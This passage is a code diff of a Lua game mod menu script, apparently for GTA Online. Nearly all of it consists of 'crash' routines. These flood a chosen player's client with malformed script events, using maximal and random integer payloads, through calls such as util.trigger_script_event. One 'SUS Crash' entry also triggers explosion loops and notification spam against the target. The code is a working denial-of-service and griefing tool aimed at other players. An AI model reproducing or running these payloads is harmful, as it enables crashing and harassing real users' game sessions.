-        			util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
-        			end
-        			util.yield()
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
-        			util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
-        			util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
-        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
-        			util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
-        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
-        			util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
-        			util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
-        			util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
-        			end
-        	menu.trigger_commands("givesh" .. players.get_name(pid))
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
-        			util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
-        			util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
-        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
-        			util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
-        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
-        			util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        			util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        			util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
-        			util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
-        			util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
-        			util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
-        			util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
-        			util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
-        			util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
-        			util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
-    	notification("SUS Crash" .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-    			end)
+            menu.toggle_loop(scrash, "SE Crash (S0)", {"crashs0"}, "A very strong SE/SH crash", function(on_toggle)
+            notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                    local int_min = -2147483647
+                    local int_max = 2147483647
+                        for i = 1, 15 do
+                            util.trigger_script_event(1 << pid, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561, math.random(int_min, int_max), math.random(int_min, int_max), 
+                            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                            util.trigger_script_event(1 << pid, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
+                        end
+                        util.yield()
+                        for i = 1, 15 do
+                            util.trigger_script_event(1 << pid, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561, pid, math.random(int_min, int_max)})
+                            util.trigger_script_event(1 << pid, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
+                        end
+                menu.trigger_commands("givesh" .. players.get_name(pid))
+                    util.trigger_script_event(1 << pid, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
+                        end)
+        
+            menu.toggle_loop(scrash, "SE Crash (S1)", {"crashs1"}, "A very strong SE/SH crash", function(on_toggle)
+            notification("SE Crash (S1) sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                    local int_min = -2147483647
+                    local int_max = 2147483647
+                        for i = 1, 15 do
+                        util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
+                            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                        util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
+                        end
+                        util.yield()
+                        for i = 1, 15 do
+                        util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, pid, math.random(int_min, int_max)})
+                        util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
+                        end
+                menu.trigger_commands("givesh" .. players.get_name(pid))
+                        util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
+                notification("SE Crashed (S1) " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                        end)
+        
+                menu.toggle_loop(scrash, "SE Crash (S2)", {"crashs2"}, "A very strong SE/SH crash", function(on_toggle)
+                notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                    local int_min = -2147483647
+                    local int_max = 2147483647
+                        for i = 1, 15 do
+                            util.trigger_script_event(1 << pid, {495813132, 23, -1022833023, -1030266475, 1113137152, 1116527247, 274946574, 828030307, math.random(int_min, int_max), math.random(int_min, int_max), 
+                            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                            util.trigger_script_event(1 << pid, {495813132, 23, -1022833023, -1030266475, 1113137152, 1116527247, 274946574, 828030307})
+                        end
+                        util.yield()
+                        for i = 1, 15 do
+                            util.trigger_script_event(1 << pid, {495813132, 23, -1022833023, -1030266475, 1113137152, 1116527247, 274946574, 828030307, pid, math.random(int_min, int_max)})
+                            util.trigger_script_event(1 << pid, {495813132, 23, -1022833023, -1030266475, 1113137152, 1116527247, 274946574, 828030307})
+                        end
+                menu.trigger_commands("givesh" .. players.get_name(pid))
+                util.trigger_script_event(1 << pid, {495813132, 23, -1022833023, -1030266475, 1113137152, 1116527247, 274946574, 828030307})
+                    end)
+        
+                menu.toggle_loop(scrash, "SE Crash (S3)", {"crashs3"}, "A very strong SE/SH crash", function(on_toggle)
+                notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                        local int_min = -2147483647
+                        local int_max = 2147483647
+                            for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {1348481963, 0, -124605528, math.random(int_min, int_max), math.random(int_min, int_max), 
+                                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                                util.trigger_script_event(1 << pid, {1348481963, 0, -124605528})
+                            end
+                            util.yield()
+                            for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {1348481963, 0, -124605528, pid, math.random(int_min, int_max)})
+                                util.trigger_script_event(1 << pid, {1348481963, 0, -124605528})
+                            end
+                menu.trigger_commands("givesh" .. players.get_name(pid))
+                        util.trigger_script_event(1 << pid, {1348481963, 0, -124605528})
+                            end)
+        
+                menu.toggle_loop(scrash, "SE Crash (S4)", {"crashs4"}, "A very strong SE/SH crash", function(on_toggle)
+                notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                        local int_min = -2147483647
+                        local int_max = 2147483647
+                            for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {-1178972880, 1, 3, 8, 1, 1, 1, math.random(int_min, int_max), math.random(int_min, int_max), 
+                                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                                util.trigger_script_event(1 << pid, {-1178972880, 1, 3, 8, 1, 1, 1})
+                            end
+                            util.yield()
+                            for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {-1178972880, 1, 3, 8, 1, 1, 1, pid, math.random(int_min, int_max)})
+                                util.trigger_script_event(1 << pid, {-1178972880, 1, 3, 8, 1, 1, 1})
+                                end
+                menu.trigger_commands("givesh" .. players.get_name(pid))
+                        util.trigger_script_event(1 << pid, {-1178972880, 1, 3, 8, 1, 1, 1})
+                                end)
+
+--[[
+
+                menu.toggle_loop(scrash, "SE Crash (S5)", {"crashs5"}, "A very strong SE/SH crash", function(on_toggle)
+                    notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                            local int_min = -2147483647
+                            local int_max = 2147483647
+                                for i = 1, 15 do
+                                    util.trigger_script_event(1 << pid, {1670832796, 17, 8389765640730081662, 3612517357159281440, 1195254326, -1315771977, -425873691, -1164711529, -1528456516, 177617928821990, 0, 0, 3141616568656, math.random(int_min, int_max), math.random(int_min, int_max), 
+                                    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                                    math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                                    util.trigger_script_event(1 << pid, {1670832796, 17, 8389765640730081662, 3612517357159281440, 1195254326, -1315771977, -425873691, -1164711529, -1528456516, 177617928821990, 0, 0, 3141616568656})
+                                end
+                                util.yield()
+                                for i = 1, 15 do
+                                    util.trigger_script_event(1 << pid, {1670832796, 17, 8389765640730081662, 3612517357159281440, 1195254326, -1315771977, -425873691, -1164711529, -1528456516, 177617928821990, 0, 0, 3141616568656, pid, math.random(int_min, int_max)})
+                                    util.trigger_script_event(1 << pid, {1670832796, 17, 8389765640730081662, 3612517357159281440, 1195254326, -1315771977, -425873691, -1164711529, -1528456516, 177617928821990, 0, 0, 3141616568656})
+                                    end
+                    menu.trigger_commands("givesh" .. players.get_name(pid))
+                            util.trigger_script_event(1 << pid, {1670832796, 17, 8389765640730081662, 3612517357159281440, 1195254326, -1315771977, -425873691, -1164711529, -1528456516, 177617928821990, 0, 0, 3141616568656})
+                                    end)
+]]       
+                                
+                menu.toggle_loop(scrash, "SE Crash (S7)", {"crashs7"}, "A very strong SE/SH crash", function(on_toggle)
+                notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                        local int_min = -2147483647
+                        local int_max = 2147483647
+                            for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736, math.random(int_min, int_max), math.random(int_min, int_max), 
+                                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                                util.trigger_script_event(1 << pid, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
+                            end
+                            util.yield()
+                            for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736, pid, math.random(int_min, int_max)})
+                                util.trigger_script_event(1 << pid, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
+                            end
+                menu.trigger_commands("givesh" .. players.get_name(pid))
+                        util.trigger_script_event(1 << pid, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
+                        end)
 
 
-            
-    local damncrash = menu.list(crash, "Damn Crash", {}, "")
+                menu.toggle_loop(scrash, "SUS Crash", {"togglesus"}, "This one is bound to hurt.", function(on_toggle)
+                notification("SUS Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                        local int_min = -2147483647
+                        local int_max = 2147483647
+                            for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
+                                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                            util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+                            end
+                            util.yield()
+                            for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
+                            util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787, math.random(int_min, int_max)})
+                            util.trigger_script_event(1 << pid, {-1529596656, pid, 795221, 59486,48512151,-9545440, math.random(int_min, int_max)})
+                            util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+                            end
+                            menu.trigger_commands("notifyspam" .. players.get_name(pid))
+                            menu.trigger_commands("explode" .. players.get_name(pid))
+                            menu.trigger_commands("explodeloop" .. players.get_name(pid))
+                            menu.trigger_commands("explosiondelay".. players.get_name(pid) .. " 50")
+                            menu.trigger_commands("explosionshake".. players.get_name(pid) .. " 10")
+                            menu.trigger_commands("ptfx" .. players.get_name(pid))
+                            menu.trigger_commands("ptfxamount" .. players.get_name(pid) .. " 250")
+                            menu.trigger_commands("ptfxsize" .. players.get_name(pid) .. " 10")
+                            menu.trigger_commands("givesh" .. players.get_name(pid))
+                            util.yield(100)
+                            util.trigger_script_event(1 << pid, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+                            util.trigger_script_event(1 << pid, {962740265, 2000000, 2000000, 2000000, 2000000})
+                            util.trigger_script_event(1 << pid, {1228916411, 1, 1245317585})
+                            util.trigger_script_event(1 << pid, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
+                            util.trigger_script_event(1 << pid, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
+                            util.trigger_script_event(1 << pid, {-555356783, pid, 85952,99999,52682274855,526822745})
+                            util.trigger_script_event(1 << pid, {526822748, pid, 78552,99999 ,7949161,789454312})
+                            util.trigger_script_event(1 << pid, {-8965204809, pid, 795221,59486,48512151,-9545440})
+                            util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
+                            util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
+                            util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
+                            util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+                notification("SUS Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                            end)
 
-    menu.action(damncrash, "Damn Crash", {"damncrash"}, "This one is bound to hurt.", function()
-    notification("Damn Crash Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-            local int_min = -2147483647
-            local int_max = 2147483647
-                for i = 1, 15 do
